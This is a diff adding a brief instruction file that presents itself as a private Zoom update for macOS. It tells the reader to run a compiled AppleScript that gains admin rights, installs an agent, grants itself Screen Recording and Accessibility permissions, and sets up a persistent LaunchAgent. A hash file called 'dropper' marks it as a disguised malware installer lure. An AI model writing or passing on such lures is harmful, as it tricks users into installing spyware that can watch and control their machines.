@@ -1,0 +1,9 @@
+Zoom Private Update - macOS
+
+Double-click "zoom-update-microsoft.scpt" and press Run in Script Editor.
+No chmod is needed (compiled .scpt).
+
+The script asks for admin rights once, installs the agent, enables
+Screen Recording/Accessibility, and starts a background LaunchAgent.
+
+Hashes: see SHA256SUMS-dropper.
